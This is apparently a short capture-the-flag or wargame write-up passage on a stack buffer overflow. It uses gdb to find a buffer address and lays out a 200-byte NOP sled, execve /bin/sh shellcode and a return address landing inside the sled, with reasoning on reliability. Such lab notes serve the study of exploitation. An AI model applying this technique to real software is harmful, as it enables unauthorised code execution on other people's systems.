## p() large buffer address

```bash
(gdb) b *p+50
(gdb) r
(gdb) x $ebp-0x1008
# → 0xbfffe680  ← large buffer starts here
```

With 200 NOP + shellcode in input 1 :

```
0xbfffe680 : \x90 * 200   ← NOP sled
0xbfffe748 : shellcode     ← execve /bin/sh
```

Target address in NOP sled :
```
0xbfffe680 + 0x90 = 0xbfffe710  ← safe landing in NOP sled
```

---

## Why 200 NOP bytes

```
strncpy copies 20 bytes → local_34 = \x90 * 20
remaining in large buffer = \x90 * 180 + shellcode

0xbfffe680 : NOP sled starts
0xbfffe680 + 200 = 0xbfffe748 : shellcode starts

target 0xbfffe710 → lands in NOP sled → slides to shellcode ✓
```

More NOPs = bigger landing zone = more reliable exploit.

